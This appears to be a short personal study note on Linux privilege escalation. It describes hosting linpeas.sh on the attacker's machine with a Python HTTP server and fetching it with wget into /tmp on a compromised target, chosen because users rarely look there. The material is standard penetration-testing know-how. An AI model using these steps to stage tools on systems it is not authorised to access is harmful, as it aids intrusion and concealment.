Now that we have these automated priv escalation scrips that helps in identifying vulnerabilities into the system

	These scripts should be run on locals machines to identify vulnerabilities

	But but when we gain access to a user in a system it is not necessary that it will have access to internet
	
	but we want to get those automated tools into the target system to escalate privileges

For that we can use SimpleHTTPserver method

>If you are running Python 3, you will get error as `No module named SimpleHTTPServer`. It’s because in python 3, SimpleHTTPServer has been merged into `http.server` module. 

we can run this commands in our system to create a webpage that others can connect to on port 80

	Note: be in that path that automated scripts are saved in

	eg linpeas.sh is stored in Desktop/linesc

	first cd Desktop/linesc

	then use the below commands to run a http server on port 80

>Sudo python -m simpleHTTPServer 80

if python 3 use below command

>Sudo python -m http.server 80


Now in the taget system with user accont

we can go to 
>cd /tmp

use tmp acc to save filed in target system.
users ususally do not access tmp files that is why it is recommended to save files here.

use this commands in target system
>wget http://<systemIP>/linpeas.sh

	Note : terminate the SimpleHTTPServer in your local system once required files are downloaded into target system






